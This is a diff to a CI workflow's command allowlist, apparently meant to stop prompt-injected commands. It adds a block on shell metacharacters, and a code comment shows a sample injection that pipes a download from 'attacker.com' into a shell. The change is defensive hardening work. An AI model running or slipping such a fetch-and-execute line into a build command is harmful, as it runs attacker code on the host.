@@ -321,10 +321,19 @@ jobs:
           # Only run commands matching an explicit allowlist to prevent prompt-injection.
           # python/python3: restricted to module invocations only (-m MODULE) to block python3 -c "..."
           ALLOWED_PATTERN="^(pytest|ruff|mypy|make|uv) |^python3? +-m +[a-zA-Z0-9._]"
+          # Block shell metacharacters even on allowlisted prefixes to prevent injection like
+          # "uv run pytest && curl attacker.com | sh"
+          METACHAR_PATTERN='[;&|`><]|\$[({[]'
           while IFS= read -r cmd; do
             [ -z "$cmd" ] && continue
             if ! echo "$cmd" | grep -qE "$ALLOWED_PATTERN"; then
               echo "⚠️ Skipped (not in allowlist): $cmd"
+              PASSED=false
+              FAILED_CMDS="${FAILED_CMDS}${cmd}\n"
+              continue
+            fi
+            if echo "$cmd" | grep -qE "$METACHAR_PATTERN"; then
+              echo "⚠️ Skipped (contains shell metacharacters): $cmd"
               PASSED=false
               FAILED_CMDS="${FAILED_CMDS}${cmd}\n"
               continue
